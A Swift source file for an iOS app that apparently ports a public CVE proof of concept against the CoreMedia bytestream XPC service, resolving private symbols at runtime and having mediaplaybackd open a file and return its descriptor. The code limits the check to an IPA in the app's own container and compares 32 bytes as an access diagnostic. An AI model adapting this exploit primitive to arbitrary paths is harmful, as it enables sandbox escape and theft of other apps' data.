import Foundation
#if os(iOS)
import Darwin
import CoreFoundation
#endif

/// Read-only research adapter for ceoca69/cve-112706 (CoreMedia bytestream).
/// It ONLY checks a downloaded IPA already inside Crumb's own data container.
/// No arbitrary paths, external app containers, database extraction or file export.
nonisolated enum CoreMediaLocalProbe {
    nonisolated struct Outcome {
        let stage: String
        let detail: String
        let comparedBytes: Int

        var summary: String {
            "CoreMedia: \(stage) (\(detail); compared \(comparedBytes) local bytes). " +
            "This is an access diagnostic, not FairPlay decryption."
        }
    }

    nonisolated static func isEligible(_ url: URL, home: URL) -> Bool {
        guard url.isFileURL, url.pathExtension.lowercased() == "ipa",
              (try? url.resourceValues(forKeys: [.isRegularFileKey, .isSymbolicLinkKey]))?.isRegularFile == true,
              (try? url.resourceValues(forKeys: [.isSymbolicLinkKey]))?.isSymbolicLink != true else {
            return false
        }
        let resolved = url.standardizedFileURL.resolvingSymlinksInPath().path
        let sandbox = home.standardizedFileURL.resolvingSymlinksInPath().path
        return resolved.hasPrefix(sandbox + "/")
    }

    nonisolated static func run(input: URL) -> Outcome {
        guard isEligible(input, home: URL(fileURLWithPath: NSHomeDirectory(), isDirectory: true)) else {
            return Outcome(stage: "blocked", detail: "requires a regular IPA within Crumb's own container", comparedBytes: 0)
        }
        #if os(iOS)
        return probe(input)
        #else
        return Outcome(stage: "unsupported", detail: "requires an actual iOS device", comparedBytes: 0)
        #endif
    }

    #if os(iOS)
    // Dynamic signatures follow the public ceoca69 proof of concept. No
    // framework-private symbols are linked into the app at build time.
    private typealias Basic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    private typealias Begin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    private typealias Complete = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    private typealias Recipient = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    private typealias SetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    private typealias Connect = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    private typealias EventHandler = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    private typealias Resume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    private typealias Send = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    private typealias GetValue = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    private typealias GetInt = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    private typealias GetUInt = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    private typealias SetUInt = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    private typealias DupFD = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    private typealias Retain = @convention(c) (OpaquePointer?) -> Void
    private typealias Release = @convention(c) (OpaquePointer?) -> Void

    private static func probe(_ input: URL) -> Outcome {
        func fail(_ stage: String, _ detail: String = "not available") -> Outcome {
            Outcome(stage: stage, detail: detail, comparedBytes: 0)
        }
        let original = open(input.path, O_RDONLY | O_NOFOLLOW)
        guard original >= 0 else { return fail("local-open", "input unavailable") }
        defer { close(original) }
        var originalStat = stat()
        guard fstat(original, &originalStat) == 0, (originalStat.st_mode & 0o170000) == 0o100000,
              originalStat.st_size >= 32 else { return fail("local-file", "invalid size or type") }

        guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
            return fail("framework", "CoreMedia unavailable")
        }
        defer { dlclose(cm) }
        let rtld = UnsafeMutableRawPointer(bitPattern: -2)
        guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
              let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
              let pComplete = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
              let pRecipient = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
              let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
              let pConnect = dlsym(rtld, "xpc_connection_create_mach_service"),
              let pHandler = dlsym(rtld, "xpc_connection_set_event_handler"),
              let pResume = dlsym(rtld, "xpc_connection_resume"),
              let pSend = dlsym(rtld, "xpc_connection_send_message_with_reply"),
              let pGetValue = dlsym(rtld, "xpc_dictionary_get_value"),
              let pGetInt = dlsym(rtld, "xpc_dictionary_get_int64"),
              let pGetUInt = dlsym(rtld, "xpc_dictionary_get_uint64"),
              let pSetUInt = dlsym(rtld, "xpc_dictionary_set_uint64"),
              let pDupFD = dlsym(rtld, "xpc_dictionary_dup_fd"),
              let pRetain = dlsym(rtld, "xpc_retain"),
              let pRelease = dlsym(rtld, "xpc_release") else {
            return fail("symbols", "required private interface unavailable")
        }

        let basic = unsafeBitCast(pBasic, to: Basic.self)
        let begin = unsafeBitCast(pBegin, to: Begin.self)
        let complete = unsafeBitCast(pComplete, to: Complete.self)
        let recipient = unsafeBitCast(pRecipient, to: Recipient.self)
        let setURL = unsafeBitCast(pSetURL, to: SetURL.self)
        let connect = unsafeBitCast(pConnect, to: Connect.self)
        let eventHandler = unsafeBitCast(pHandler, to: EventHandler.self)
        let resume = unsafeBitCast(pResume, to: Resume.self)
        let sendMessage = unsafeBitCast(pSend, to: Send.self)
        let getValue = unsafeBitCast(pGetValue, to: GetValue.self)
        let getInt = unsafeBitCast(pGetInt, to: GetInt.self)
        let getUInt = unsafeBitCast(pGetUInt, to: GetUInt.self)
        let setUInt = unsafeBitCast(pSetUInt, to: SetUInt.self)
        let dupFD = unsafeBitCast(pDupFD, to: DupFD.self)
        let retain = unsafeBitCast(pRetain, to: Retain.self)
        let release = unsafeBitCast(pRelease, to: Release.self)

        guard let connection = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({
            connect($0, nil, 0)
        }) else { return fail("connection", "XPC service unavailable") }
        defer { release(OpaquePointer(connection)) }
        let handler: @convention(block) (UnsafeMutableRawPointer?) -> Void = { _ in }
        eventHandler(connection, handler as AnyObject)
        resume(connection)

        func exchange(_ message: UnsafeMutableRawPointer?) -> OpaquePointer? {
            guard let message else { return nil }
            let semaphore = DispatchSemaphore(value: 0)
            var response: OpaquePointer?
            let reply: @convention(block) (UnsafeMutableRawPointer?) -> Void = { raw in
                if let raw {
                    response = OpaquePointer(raw)
                    retain(response)
                }
                semaphore.signal()
            }
            sendMessage(connection, message, nil, reply as AnyObject)
            guard semaphore.wait(timeout: .now() + 5) == .success else { return nil }
            return response
        }

        var rp1: UnsafeMutableRawPointer?
        guard basic(0x2e727031, 0, &rp1) == 0, let m1 = rp1 else { return fail("handshake-rp1") }
        let r1 = exchange(m1)
        release(OpaquePointer(m1))
        guard let r1 else { return fail("handshake-rp1") }
        defer { release(r1) }
        var rp2: UnsafeMutableRawPointer?
        guard basic(0x2e727032, 0, &rp2) == 0, let m2 = rp2 else { return fail("handshake-rp2") }
        var originRecipient: UnsafeMutableRawPointer?
        _ = "mconf".withCString { recipient(r1, m2, $0, &originRecipient) }
        let r2 = exchange(m2)
        release(OpaquePointer(m2))
        guard let r2 else { return fail("handshake-rp2") }
        release(r2)

        var org: UnsafeMutableRawPointer?
        guard basic(0x2e6f7267, 0, &org) == 0, let mOrg = org else { return fail("handshake-origin") }
        _ = begin(mOrg)
        let rOrg = exchange(mOrg)
        release(OpaquePointer(mOrg))
        guard let rOrg else { return fail("handshake-origin") }
        var origin: UnsafeMutableRawPointer?
        let established = complete(rOrg, &origin) == 0 && origin != nil
        release(rOrg)
        guard established else { return fail("handshake-origin", "origin not established") }

        var request: UnsafeMutableRawPointer?
        guard basic(0x4375726c, 0, &request) == 0, let mCurl = request else { return fail("request") }
        let url = input as CFURL
        guard setURL(mCurl, "CreationURL", Unmanaged.passUnretained(url).toOpaque()) == 0 else {
            release(OpaquePointer(mCurl))
            return fail("request-url")
        }
        setUInt(OpaquePointer(mCurl), "FileOpenOptions", 0)
        let response = exchange(mCurl)
        release(OpaquePointer(mCurl))
        guard let response else { return fail("reply", "no response") }
        defer { release(response) }
        guard let details = getValue(response, "ByteStreamDetails") else {
            return fail("denied", "daemon status \(getInt(response, ".ErrorReturn"))")
        }
        let descriptor = dupFD(details, "FileDescriptor")
        guard descriptor >= 0 else { return fail("descriptor", "daemon did not return a descriptor") }
        defer { close(descriptor) }
        var remoteStat = stat()
        guard fstat(descriptor, &remoteStat) == 0, remoteStat.st_size == originalStat.st_size,
              (remoteStat.st_mode & 0o170000) == 0o100000 else {
            return fail("descriptor", "file identity/size check failed")
        }
        var reference = [UInt8](repeating: 0, count: 32)
        var received = [UInt8](repeating: 0, count: 32)
        guard pread(original, &reference, reference.count, 0) == 32,
              pread(descriptor, &received, received.count, 0) == 32,
              reference == received else { return fail("comparison", "bytes did not match local IPA") }
        // Explicitly close the server-side stream; never copy or export its data.
        let streamID = getUInt(details, "ObjectID")
        var closeRequest: UnsafeMutableRawPointer?
        if basic(0x646f6f6d, streamID, &closeRequest) == 0, let mClose = closeRequest {
            let closed = exchange(mClose)
            if let closed { release(closed) }
            release(OpaquePointer(mClose))
        }
        return Outcome(stage: "matched", detail: "daemon read matched the local IPA", comparedBytes: 32)
    }
    #endif
}
